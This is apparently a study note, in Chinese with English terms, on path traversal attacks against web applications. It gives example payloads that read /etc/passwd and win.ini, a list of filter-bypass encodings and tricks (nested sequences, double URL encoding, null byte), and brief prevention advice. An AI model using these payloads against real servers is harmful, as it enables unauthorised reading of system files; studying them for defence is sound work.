## Path traversal (../)
- 能夠讀取運行應用程式的伺服器上的任意檔案
- 能夠寫入伺服器上的任意文件
- 修改應用程式資料或行為

**Example : **
- <"img src="/loadImage?filename=218.png""> --> call /var/www/images/218.png
- https://insecure-website.com/loadImage?filename=../../../etc/passwd
- ../和都是..\有效的目錄遍歷序列
-  Windows 伺服器 : https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini

## Bypass : 
- 絕對路徑 : filename=/etc/passwd
- Ｎested traversal : "....//" or "....\/"
    - (....//....//....//etc/passwd)
- URL 編碼 :%2e%2e%2f, %252e%252e%252f , ..%c0%af or ..%ef%bc%8f
    - Burp Intruder: Fuzzing - path traversal
- 基底資料夾 : filename=/var/www/images/../../../etc/passwd
- 副檔名結尾 : filename=../../../etc/passwd%00.png

## prevent a path traversal attack
- 白名單 : 處理使用者輸入之前，請先驗證其有效性
- 僅包含字母數字字元
- 使用平台檔案系統 API 來規範化該路徑
